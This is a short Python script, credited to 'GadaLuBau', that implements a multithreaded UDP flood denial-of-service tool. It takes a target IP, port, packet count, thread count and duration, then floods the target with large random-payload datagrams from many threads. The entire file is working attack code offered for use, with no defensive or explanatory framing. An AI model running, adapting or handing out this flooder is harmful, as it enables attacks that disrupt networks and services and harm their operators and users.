#Author GadaLuBau
import socket
import sys,os 
import threading
import time 
import random 

if len(sys.argv) < 5:
  print("UDP-Flood By GadaLuBau")
  sys.exit("> Usage : python "+sys.argv[0]+"<ip> <port> <packet> <threads> <time>")
  
print("> Code By GadaLuBau")
ip = str(sys.argv[1])
port = int(sys.argv[2])
packet = int(sys.argv[3])
threads = int(sys.argv[4])
times = float(sys.argv[5])
  
timeout = time.time() + 1 * times
  
def udp(ip, port, packet, times):
  timeout = time.time() + 1 * times
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
  print(f"Flooding > {ip}:{port} time {times}")
  while time.time() < timeout:
    try:
      try:
        data = random._urandom(int(random.randint(1025, 65505)))
        for _ in range(packet):
          s.sendto(data, (str(ip), int(port)))
      except:
        s.close()
    except:
      s.close()
  print("Flooding > end")
              
def main():
  global threads
  for _ in range(threads):
    thread = []
    th = threading.Thread(target=udp, args=(ip, port, packet, times))
    thread.append(th)
    th.start()
                  
if __name__ == '__main__':
  try:
    main()
  except KeyboardInterrupt:
    print('\nBye Byee')
    sys.exit()
